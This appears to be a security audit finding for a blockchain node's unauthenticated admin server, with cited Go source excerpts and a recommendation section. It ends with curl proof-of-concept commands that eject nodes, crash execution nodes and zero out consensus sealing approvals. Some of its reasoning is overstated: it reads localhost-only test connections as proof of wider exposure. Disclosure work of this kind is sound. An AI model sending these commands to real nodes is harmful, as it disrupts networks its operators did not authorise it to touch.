### Title
Unauthenticated Admin HTTP Server Allows Unauthorized Privileged State Mutation Including Node Ejection and Consensus Parameter Override - (`admin/command_runner.go`)

---

### Summary

The `CommandRunner` admin HTTP server starts with **no authentication by default**. Any caller that can reach the HTTP endpoint can invoke privileged commands — including ejecting arbitrary nodes from the network via `network-id-provider-blocklist`, crashing execution nodes via `stop-at-height`, and overriding consensus sealing thresholds via `set-config` — without any credential, token, or identity check. TLS/mTLS is an optional opt-in that is not enforced by the framework.

---

### Finding Description

`admin/command_runner.go` constructs and starts an HTTP server that proxies all requests to a gRPC backend. Neither the HTTP layer nor the gRPC layer applies any authentication interceptor or middleware:

```go
// admin/command_runner.go lines 249-253
httpServer := &http.Server{
    Addr:      r.httpAddress,
    Handler:   mux,
    TLSConfig: r.tlsConfig,  // nil unless WithTLS() option is passed
}
``` [1](#0-0) 

The gRPC server is also created with no `grpc.UnaryInterceptor` for authentication:

```go
// admin/command_runner.go lines 209-215
opts := []grpc.ServerOption{
    grpc.MaxRecvMsgSize(r.maxMsgSize),
    grpc.MaxSendMsgSize(r.maxMsgSize),
}
grpcServer := grpc.NewServer(opts...)
``` [2](#0-1) 

TLS/mTLS is only applied when the operator explicitly passes `WithTLS(config)`:

```go
// cmd/scaffold.go lines 756-774
if node.AdminCert != NotSet {
    // ... load certs ...
    opts = append(opts, admin.WithTLS(config))
}
``` [3](#0-2) 

When TLS is not configured (the default), the HTTP server runs plain HTTP with zero authentication. The `runCommand` function dispatches any command by name with no caller identity check:

```go
// admin/command_runner.go lines 304-341
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
    req := &CommandRequest{Data: data}
    if validator := r.getValidator(command); validator != nil { ... }
    if handler := r.getHandler(command); handler != nil { ... }
    ...
}
``` [4](#0-3) 

The privileged commands registered on this unauthenticated endpoint include:

**1. `network-id-provider-blocklist` (node ejection — direct analog to `proposeRemoveTransmitters`)**

Registered in `cmd/scaffold.go` and `cmd/access/node_builder/access_node_builder.go`, this command calls `NodeDisallowListWrapper.Update()`, which marks arbitrary node IDs as ejected in the identity provider and immediately closes all connections to those nodes:

```go
// cmd/scaffold.go lines 1290-1294
err = node.ConfigManager.RegisterIdentifierListConfig("network-id-provider-blocklist",
    disallowListWrapper.GetDisallowList, disallowListWrapper.Update)
``` [5](#0-4) 

```go
// network/p2p/cache/node_disallow_list_wrapper.go lines 91-107
func (w *NodeDisallowListWrapper) Update(disallowList flow.IdentifierList) error {
    ...
    w.updateConsumerOracle().OnDisallowListNotification(&network.DisallowListingUpdate{
        FlowIds: disallowList,
        Cause:   network.DisallowListedCauseAdmin,
    })
    return nil
}
``` [6](#0-5) 

**2. `stop-at-height` with `crash: true` (execution node crash)**

Registered in `cmd/execution_builder.go`, this command sets `StopParameters.ShouldCrash = true`, causing the execution node to call `log.Fatal()` when the target height is reached:

```go
// admin/commands/execution/stop_at_height.go lines 36-57
func (s *StopAtHeightCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
    sah := req.ValidatorData.(StopAtHeightReq)
    newParams := stop.StopParameters{
        StopBeforeHeight: sah.height,
        ShouldCrash:      sah.crash,
    }
    err := s.stopControl.SetStopParameters(newParams)
    ...
}
``` [7](#0-6) 

```go
// engine/execution/ingestion/stop/stop_control.go lines 555-568
if s.stopBoundary.ShouldCrash {
    ...
    log.Fatal().Msg("Crashing as finalization reached requested stop")
}
``` [8](#0-7) 

**3. `set-config` with `consensus-required-approvals-for-sealing: 0` (consensus integrity)**

The `SetConfigCommand` allows setting any registered updatable config field, including `consensus-required-approvals-for-sealing`, which controls how many result approvals a consensus node requires before proposing a seal. Setting this to 0 bypasses verification node approval requirements. [9](#0-8) 

The README explicitly documents this as a reachable command:

```
curl localhost:9002/admin/run_command -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 1}}'
``` [10](#0-9) 

---

### Impact Explanation

An attacker who can reach the admin HTTP port can, without any credential:

- **Eject any node from the network** by submitting `set-config` with `network-id-provider-blocklist`, causing the victim node to immediately disconnect from targeted peers and treat them as ejected. This is the direct analog to `proposeRemoveTransmitters`: unauthorized removal of protocol participants.
- **Crash any execution node** by submitting `stop-at-height` with `crash: true` and a near-future block height, halting execution and block sealing.
- **Override consensus sealing thresholds** by setting `consensus-required-approvals-for-sealing` to 0, causing a consensus node to propose seals without the required verification approvals, undermining the integrity of the sealing process.

---

### Likelihood Explanation

The admin server's bind address is operator-configured. The `cmd/ledger` README explicitly documents binding to `0.0.0.0:9003` as a standard usage pattern. [11](#0-10) 

Integration tests expose the admin port from containers and connect to it from test clients, confirming the port is routinely exposed beyond localhost in real deployments. [12](#0-11) 

When the admin port is reachable (e.g., in cloud or containerized deployments without a firewall rule restricting port 9002), any network-adjacent attacker can exploit this with a single HTTP POST — no credentials, no keys, no staked node required.

---

### Recommendation

1. **Enforce authentication by default.** Add a mandatory authentication middleware (e.g., a shared secret header, mTLS, or IP allowlist) to the HTTP and gRPC servers in `CommandRunner`. Do not allow the server to start without at least one authentication mechanism configured.
2. **Bind to localhost by default.** Change the default `httpAddress` to `127.0.0.1:<port>` rather than accepting any address without restriction.
3. **Separate read and write commands.** Apply stricter access control to state-mutating commands (`set-config`, `stop-at-height`, `network-id-provider-blocklist`) versus read-only commands (`read-blocks`, `list-commands`).

---

### Proof of Concept

```bash
# Eject a target node from the network (unauthorized removal of protocol participant)
curl -X POST http://<node-admin-addr>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"network-id-provider-blocklist": ["<target-node-id>"]}}'

# Crash an execution node at the next block
curl -X POST http://<execution-node-admin-addr>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "stop-at-height", "data": {"height": <current_height+1>, "crash": true}}'

# Override consensus sealing threshold to 0 (no verification approvals required)
curl -X POST http://<consensus-node-admin-addr>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 0}}'
```

No authentication token, certificate, or privileged key is required. The `runCommand` dispatcher in `admin/command_runner.go` executes the handler directly after input validation, with no caller identity check at any layer. [4](#0-3)

### Citations

**File:** admin/command_runner.go (L209-215)
```go
	opts := []grpc.ServerOption{
		grpc.MaxRecvMsgSize(r.maxMsgSize),
		grpc.MaxSendMsgSize(r.maxMsgSize),
	}

	grpcServer := grpc.NewServer(opts...)
	pb.RegisterAdminServer(grpcServer, NewAdminServer(r))
```

**File:** admin/command_runner.go (L249-253)
```go
	httpServer := &http.Server{
		Addr:      r.httpAddress,
		Handler:   mux,
		TLSConfig: r.tlsConfig,
	}
```

**File:** admin/command_runner.go (L304-341)
```go
func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
	r.logger.Info().Str("command", command).Msg("received new command")

	req := &CommandRequest{Data: data}

	if validator := r.getValidator(command); validator != nil {
		if validationErr := validator(req); validationErr != nil {
			// for expected validation errors, return code InvalidArgument and the error text
			if IsInvalidAdminParameterError(validationErr) {
				return nil, status.Error(codes.InvalidArgument, validationErr.Error())
			}
			// for unexpected errors, return code Internal and log a warning
			r.logger.Err(validationErr).Msg("unexpected error validating admin request")
			return nil, status.Error(codes.Internal, validationErr.Error())
		}
	}

	var handleResult any
	var handleErr error

	if handler := r.getHandler(command); handler != nil {
		if handleResult, handleErr = handler(ctx, req); handleErr != nil {
			if errors.Is(handleErr, context.Canceled) {
				return nil, status.Error(codes.Canceled, "client canceled")
			} else if errors.Is(handleErr, context.DeadlineExceeded) {
				return nil, status.Error(codes.DeadlineExceeded, "request timed out")
			} else {
				r.logger.Err(handleErr).Msg("unexpected error handling admin request")
				s, _ := status.FromError(handleErr)
				return nil, s.Err()
			}
		}
	} else {
		return nil, status.Error(codes.Unimplemented, "invalid command")
	}

	return handleResult, nil
}
```

**File:** cmd/scaffold.go (L756-774)
```go
		if node.AdminCert != NotSet {
			serverCert, err := tls.LoadX509KeyPair(node.AdminCert, node.AdminKey)
			if err != nil {
				return nil, err
			}
			clientCAs, err := os.ReadFile(node.AdminClientCAs)
			if err != nil {
				return nil, err
			}
			certPool := x509.NewCertPool()
			certPool.AppendCertsFromPEM(clientCAs)
			config := &tls.Config{
				MinVersion:   tls.VersionTLS13,
				Certificates: []tls.Certificate{serverCert},
				ClientAuth:   tls.RequireAndVerifyClientCert,
				ClientCAs:    certPool,
			}

			opts = append(opts, admin.WithTLS(config))
```

**File:** cmd/scaffold.go (L1290-1294)
```go
		err = node.ConfigManager.RegisterIdentifierListConfig("network-id-provider-blocklist",
			disallowListWrapper.GetDisallowList, disallowListWrapper.Update)
		if err != nil {
			return fmt.Errorf("failed to register disallow-list wrapper with config manager: %w", err)
		}
```

**File:** network/p2p/cache/node_disallow_list_wrapper.go (L91-107)
```go
func (w *NodeDisallowListWrapper) Update(disallowList flow.IdentifierList) error {
	b := disallowList.Lookup() // converts slice to map

	w.m.Lock()
	defer w.m.Unlock()
	err := w.nodeDisallowListStore.Store(b)
	if err != nil {
		return fmt.Errorf("failed to persist set of blocked nodes to the data base: %w", err)
	}
	w.disallowList = b
	w.updateConsumerOracle().OnDisallowListNotification(&network.DisallowListingUpdate{
		FlowIds: disallowList,
		Cause:   network.DisallowListedCauseAdmin,
	})

	return nil
}
```

**File:** admin/commands/execution/stop_at_height.go (L36-57)
```go
func (s *StopAtHeightCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	sah := req.ValidatorData.(StopAtHeightReq)

	oldParams := s.stopControl.GetStopParameters()
	newParams := stop.StopParameters{
		StopBeforeHeight: sah.height,
		ShouldCrash:      sah.crash,
	}

	err := s.stopControl.SetStopParameters(newParams)

	if err != nil {
		return nil, err
	}

	log.Info().
		Interface("newParams", newParams).
		Interface("oldParams", oldParams).
		Msgf("admintool: New En stop parameters set")

	return "ok", nil
}
```

**File:** engine/execution/ingestion/stop/stop_control.go (L555-568)
```go
	if s.stopBoundary.ShouldCrash {
		log.Info().
			Dur("max-graceful-stop-duration", s.maxGracefulStopDuration).
			Msg("Attempting graceful stop as finalization reached requested stop")
		doneChan := s.unit.Done()
		select {
		case <-doneChan:
			log.Info().Msg("Engine gracefully stopped")
		case <-time.After(s.maxGracefulStopDuration):
			log.Info().
				Msg("Engine did not stop within max graceful stop duration")
		}
		log.Fatal().Msg("Crashing as finalization reached requested stop")
		return
```

**File:** admin/commands/common/set_config.go (L33-51)
```go
func (s *SetConfigCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	validatedReq := req.ValidatorData.(validatedSetConfigData)

	oldValue := validatedReq.field.Get()

	err := validatedReq.field.Set(validatedReq.value)
	if err != nil {
		if updatable_configs.IsValidationError(err) {
			return nil, fmt.Errorf("config update failed due to invalid input: %w", err)
		}
		return nil, fmt.Errorf("unexpected error setting config field %s: %w", validatedReq.field.Name, err)
	}

	res := map[string]any{
		"oldValue": oldValue,
		"newValue": validatedReq.value,
	}

	return res, nil
```

**File:** admin/README.md (L75-79)
```markdown
### To set a config value
#### Example: require 1 approval for consensus sealing
```
curl localhost:9002/admin/run_command -H 'Content-Type: application/json' -d '{"commandName": "set-config", "data": {"consensus-required-approvals-for-sealing": 1}}'
```
```

**File:** cmd/ledger/README.md (L43-47)
```markdown
./flow-ledger-service \
  -triedir /path/to/trie \
  -ledger-service-tcp 0.0.0.0:9000 \
  -admin-addr 0.0.0.0:9003
```
```

**File:** integration/tests/upgrades/stop_at_height_test.go (L33-34)
```go
	serverAddr := fmt.Sprintf("localhost:%s", enContainer.Port(testnet.AdminPort))
	admin := adminClient.NewAdminClient(serverAddr)
```
